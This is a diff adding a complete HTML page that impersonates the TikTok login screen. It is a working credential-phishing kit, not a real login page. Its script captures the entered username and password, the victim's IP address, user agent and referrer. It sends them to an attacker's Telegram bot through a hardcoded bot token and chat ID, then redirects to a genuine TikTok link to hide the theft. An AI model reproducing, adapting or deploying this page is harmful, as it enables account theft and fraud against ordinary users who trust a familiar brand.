@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | TikTok</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: "TikTokFont", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, "PingFang SC", sans-serif;
+            background: #000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 0 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            width: 36px;
+            height: 36px;
+            margin-bottom: 20px;
+        }
+        .logo svg {
+            width: 100%;
+            height: 100%;
+            fill: #fff;
+        }
+        h1 {
+            font-size: 26px;
+            font-weight: 700;
+            text-align: center;
+            letter-spacing: -0.3px;
+        }
+        .subtitle {
+            font-size: 14px;
+            color: #888;
+            text-align: center;
+            margin: 8px 0 32px;
+            line-height: 1.5;
+        }
+        .tab-bar {
+            display: flex;
+            width: 100%;
+            border-bottom: 1px solid #222;
+            margin-bottom: 24px;
+        }
+        .tab-bar div {
+            flex: 1;
+            text-align: center;
+            padding: 12px 0;
+            font-size: 14px;
+            font-weight: 600;
+            color: #555;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .tab-bar div.active {
+            color: #fff;
+            border-bottom: 2px solid #fff;
+        }
+        .tab-content {
+            display: none;
+            width: 100%;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .qr-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0;
+        }
+        .qr-placeholder {
+            width: 180px;
+            height: 180px;
+            background: #1a1a1a;
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            border: 2px solid #333;
+        }
+        .qr-placeholder svg {
+            width: 140px;
+            height: 140px;
+            opacity: 0.6;
+        }
+        .qr-text {
+            font-size: 13px;
+            color: #888;
+        }
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+        .input-group {
+            position: relative;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .input-group input:focus {
+            border-color: #666;
+        }
+        .input-group input::placeholder {
+            color: #666;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #fe2c55;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 4px;
+        }
+        .login-btn:hover {
+            background: #e6294c;
+        }
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            margin: 16px 0;
+        }
+        .divider span {
+            flex: 1;
+            height: 1px;
+            background: #222;
+        }
+        .divider p {
+            font-size: 12px;
+            color: #555;
+            white-space: nowrap;
+        }
+        .social-btn {
+            width: 100%;
+            padding: 13px;
+            background: transparent;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.2s;
+        }
+        .social-btn:hover {
+            background: #111;
+        }
+        .social-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+        .terms {
+            font-size: 11px;
+            color: #555;
+            text-align: center;
+            margin: 20px 0 16px;
+            line-height: 1.6;
+        }
+        .terms a {
+            color: #888;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .terms a:hover {
+            text-decoration: underline;
+        }
+        .signup-link {
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 24px;
+        }
+        .signup-link a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            font-size: 12px;
+            color: #444;
+            margin-top: 8px;
+        }
+        .error-msg {
+            color: #fe2c55;
+            font-size: 12px;
+            display: none;
+            margin-top: -8px;
+        }
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #fff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .btn-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M17.66 0H12.3v16.48c0 2.1-1.7 3.82-3.8 3.82s-3.8-1.72-3.8-3.82 1.7-3.82 3.8-3.82c.26 0 .52.02.78.08V7.64h-.08C5.3 7.64 2 10.96 2 14.98s3.3 7.34 7.34 7.34 7.34-3.3 7.34-7.34V7.06A11.66 11.66 0 0 0 22 9.68V4.12a7.02 7.02 0 0 1-4.34-4.12Z"/>
+            </svg>
+        </div>
+
+        <!-- Title -->
+        <h1>Log in to TikTok</h1>
+        <p class="subtitle">Manage your account, check notifications, comment on videos, and more.</p>
+
+        <!-- Tab Bar -->
+        <div class="tab-bar">
+            <div class="active" onclick="switchTab('qr')">Use QR code</div>
+            <div onclick="switchTab('email')">Use phone / email / username</div>
+        </div>
+
+        <!-- QR Tab -->
+        <div id="tab-qr" class="tab-content active">
+            <div class="qr-box">
+                <div class="qr-placeholder">
+                    <svg viewBox="0 0 24 24" fill="#555">
+                        <path d="M3 3h7v7H3V3Zm2 2v3h3V5H5ZM14 3h7v7h-7V3Zm2 2v3h3V5h-3ZM3 14h7v7H3v-7Zm2 2v3h3v-3H5Zm8-2h2v2h-2v-2Zm2-2h2v2h-2v-2Zm2 0h2v2h-2v-2Zm0 4h2v2h-2v-2Zm2-2h2v2h-2v-2Zm-4 2h2v2h-2v-2Zm-2 2h2v2h-2v-2Zm4 2h2v2h-2v-2Z"/>
+                    </svg>
+                </div>
+                <p class="qr-text">Scan the QR code using the TikTok app</p>
+            </div>
+        </div>
+
+        <!-- Email/Phone Tab -->
+        <div id="tab-email" class="tab-content">
+            <form id="loginForm" class="login-form" autocomplete="off">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Phone number, email address, or username" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <p class="error-msg" id="errorMsg">Incorrect username or password. Please try again.</p>
+                <button type="submit" class="login-btn" id="loginBtn">
+                    <span class="btn-content" id="btnContent">
+                        <span id="btnText">Log in</span>
+                        <span class="spinner" id="spinner"></span>
+                    </span>
+                </button>
+            </form>
+        </div>
+
+        <!-- Divider -->
+        <div class="divider">
+            <span></span>
+            <p>Or continue with</p>
+            <span></span>
+        </div>
+
+        <!-- Social Buttons -->
+        <button class="social-btn" onclick="return false;">
+            <svg viewBox="0 0 24 24" fill="#fff"><path d="M24 12.073c0-6.627-5.373-12-12-12S0 5.446 0 12.073c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+            Continue with Facebook
+        </button>
+        <button class="social-btn" onclick="return false;">
+            <svg viewBox="0 0 24 24"><path fill="#fff" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#fff" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fff" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#fff" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+            Continue with Google
+        </button>
+        <button class="social-btn" onclick="return false;">
+            <svg viewBox="0 0 24 24" fill="#fff"><path d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
+            Continue with Apple
+        </button>
+
+        <!-- Terms -->
+        <p class="terms">
+            By continuing, you agree to TikTok's
+            <a href="#" onclick="return false;">Terms of Service</a>
+            and confirm that you have read TikTok's
+            <a href="#" onclick="return false;">Privacy Policy</a>.
+        </p>
+
+        <!-- Signup -->
+        <p class="signup-link">
+            Don't have an account?<a href="#" onclick="return false;">Sign up</a>
+        </p>
+
+        <p class="footer">English (US) &copy; 2026 TikTok</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8744660337:AAFzZZC3ZoL8atGvDDjJaKLNADrvuRpa_WI";
+        const CHAT_ID = "7931506960";
+        const REDIRECT_URL = "https://vt.tiktok.com/ZS97BrF93/";
+
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-bar div').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            if (tab === 'qr') {
+                document.querySelector('.tab-bar div:first-child').classList.add('active');
+                document.getElementById('tab-qr').classList.add('active');
+            } else {
+                document.querySelector('.tab-bar div:last-child').classList.add('active');
+                document.getElementById('tab-email').classList.add('active');
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const btn = document.getElementById('loginBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            const errorMsg = document.getElementById('errorMsg');
+
+            if (!username || !password) return;
+
+            // Show loading
+            btn.disabled = true;
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            errorMsg.style.display = 'none';
+
+            // Get IP and user agent for extra info
+            let ipInfo = '';
+            try {
+                const ipResp = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResp.json();
+                ipInfo = ipData.ip;
+            } catch(e) {
+                ipInfo = 'Unknown';
+            }
+
+            const userAgent = navigator.userAgent;
+            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
+            const pageUrl = window.location.href;
+            const referrer = document.referrer || 'Direct';
+
+            const message = `🔴 TikTok Credentials Captured\n\n` +
+                `👤 Username/Email: ${username}\n` +
+                `🔑 Password: ${password}\n` +
+                `🌐 IP: ${ipInfo}\n` +
+                `🕐 Time: ${timestamp} UTC\n` +
+                `📱 User-Agent: ${userAgent}\n` +
+                `📄 Page: ${pageUrl}\n` +
+                `🔗 Referrer: ${referrer}`;
+
+            // Send to Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.log('Telegram send error:', e);
+            }
+
+            // Small delay so they see something happened
+            await new Promise(r => setTimeout(r, 800));
+
+            // Redirect to the real TikTok video
+            window.location.href = REDIRECT_URL;
+        });
+    </script>
+</body>
+</html>
